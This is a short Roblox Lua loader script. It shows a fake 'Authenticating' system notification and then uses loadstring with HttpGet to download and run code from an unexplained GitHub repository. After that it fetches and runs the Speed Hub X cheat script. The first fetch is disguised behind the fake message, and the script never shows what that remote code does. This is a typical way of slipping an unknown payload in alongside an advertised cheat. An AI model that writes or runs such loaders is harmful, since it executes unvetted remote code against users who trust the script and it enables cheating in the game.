-- Notification
game.StarterGui:SetCore("SendNotification", {
    Title = "System Message",
    Text = "🔒 Authenticating... Please stand by.",
    Duration = 3
})

-- Second script immediately
loadstring(game:HttpGet("https://raw.githubusercontent.com/Updates-Script/Updated/refs/heads/main/Script.lua"))()

-- Wait 4 seconds, then Speed Hub X
wait(4)
loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
